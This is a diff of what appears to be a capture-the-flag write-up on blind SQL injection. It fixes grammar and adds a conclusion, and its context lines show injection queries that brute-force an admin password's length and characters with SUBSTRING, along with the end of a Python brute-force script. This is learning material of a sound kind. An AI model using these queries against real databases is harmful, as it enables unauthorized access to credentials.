@@ -17,12 +17,12 @@ And the output when injection happens
 ![Injected output](/assets/images/old-21/2.png)
 
 # Getting the clue
-Further tests confirms that `admin` is the correct username, by trying the following SQL Query, we can brute force the length of the password
+Further tests confirmed that `admin` was the correct username. By trying the following SQL Query, we can brute force the length of the password
 
 ```sql
 SELECT id, pw FROM table_name WHERE id='admin' and length(pw)=1 or '1'='1'
 ```
-After a bit of research, I found the `SUBSTRING` function in SQL allows us to brute force the password by comparing with every character in the printable characters.
+After a bit of research, I found the `SUBSTRING` function in SQL allowed us to brute force the password by comparing with every character in the printable characters.
 
 ```sql
 SELECT id, pw FROM table_name WHERE id='admin' and SUBSTRING(pw, 1, 1)='a' or '1'='1'
@@ -84,3 +84,6 @@ def brute_pw(len):
 l = brute_pw_length()
 brute_pw(l)
 ```
+
+# Conclusion
+A basic but useful challenge to help me getting more insights into Blind SQL Injection.
